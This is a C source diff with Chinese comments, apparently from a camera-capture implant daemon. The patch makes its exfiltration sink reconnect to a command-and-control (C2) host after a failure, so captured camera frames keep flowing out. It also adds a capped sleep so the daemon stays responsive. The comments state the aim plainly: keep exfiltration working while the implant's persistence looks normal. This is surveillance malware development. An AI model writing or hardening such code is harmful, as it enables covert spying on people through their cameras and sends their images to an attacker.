@@ -274,7 +274,21 @@ static int cd_tls_handshake(cd_sink_t *s)
  */
 static int cd_write_all(cd_sink_t *s, const uint8_t *buf, size_t n)
 {
-    if (!s || s->sink_fd < 0) return -1;
+    if (!s) return -1;
+
+    /* fd 为 -1 不等于"不该回传"，它也可能是上一轮重连失败留下的状态。
+     *
+     * 直接返回的后果是出口永久失效：cd_sink_reconnect 失败时会先把
+     * sink_fd 置 -1 再返回，此后每一批都在这一行短路，再也不会尝试
+     * 重建连接。C2 抖动或对端重启期间只要失败过一次，这台机器就再
+     * 也回传不了任何画面，而进程还在跑、日志也没有新错误 —— 驻留
+     * 看起来完全正常。
+     *
+     * 所以 tcp:// 出口（host 非空）必须先尝试重连，失败才放弃。 */
+    if (s->sink_fd < 0) {
+        if (!s->host[0]) return -1;
+        if (cd_sink_reconnect(s) != 0) return -1;
+    }
 
     /* TLS 出口：写的是 TLS 记录，不是裸字节。
      *
@@ -374,7 +388,12 @@ static int cd_exfil(const uint8_t *data, size_t len, const char *name, void *ud)
     cd_sink_t *s = (cd_sink_t *)ud;
     (void)name;
     if (!s || !data || len == 0) return -1;
-    if (s->sink_fd < 0) { s->last_err = -1; return -1; }
+    /* 只有"本就不回传"（spec 为 NULL）才在此短路。
+     *
+     * 写成 s->sink_fd < 0 会把"上一轮重连失败"也一并短路掉：那种情况下
+     * cd_write_all 里的重连逻辑永远得不到执行，出口从此永久失效。判据
+     * 必须是"有没有 host"——tcp:// 出口 host 非空，需要重连而不是放弃。 */
+    if (s->sink_fd < 0 && !s->host[0]) { s->last_err = -1; return -1; }
 
     if (cd_write_all(s, data, len) != 0) {
         s->last_err = errno ? -errno : -1;
@@ -704,6 +723,27 @@ static void cd_sink_close(cd_sink_t *s)
     s->sink_owned = 0;
 }
 
+/* 等待期让出 CPU：睡到下一批到期，但单次不超过 CD_SLEEP_MAX_US。
+ *
+ * 不封顶的后果：批间隔配成 1 小时就一次睡 1 小时，停止信号与 C2
+ * 断线重连都要等这么久才被响应；封顶后每次最多睡 50ms，停止请求
+ * 的响应延迟有界。
+ *
+ * 信号处理会打断 nanosleep（返回 -1/EINTR）。这里不重试剩余时间：
+ * 外层 ST_WAIT 会再次调用本函数，而立即返回恰好让停止请求被
+ * 尽快处理。 */
+#define CD_SLEEP_MAX_US 50000ULL
+static void cd_sleep_us(uint64_t us, void *ud)
+{
+    (void)ud;
+    if (us > CD_SLEEP_MAX_US) us = CD_SLEEP_MAX_US;
+    if (us == 0) return;
+    struct timespec ts;
+    ts.tv_sec  = (time_t)(us / 1000000ULL);
+    ts.tv_nsec = (long)((us % 1000000ULL) * 1000ULL);
+    (void)nanosleep(&ts, NULL);
+}
+
 /* ---- pid 文件 ---- */
 static int cd_write_pid(const char *path)
 {
@@ -825,6 +865,7 @@ int cam_daemon_run(const cam_daemon_cfg_t *cfg, cam_daemon_stats_t *out_stats)
     }
 
     implant_set_now(im, cd_now_us, NULL);
+    implant_set_sleep(im, cd_sleep_us, NULL);
     implant_set_pack(im, cd_pack, &sink);
     implant_set_exfil(im, cd_exfil, &sink);
 
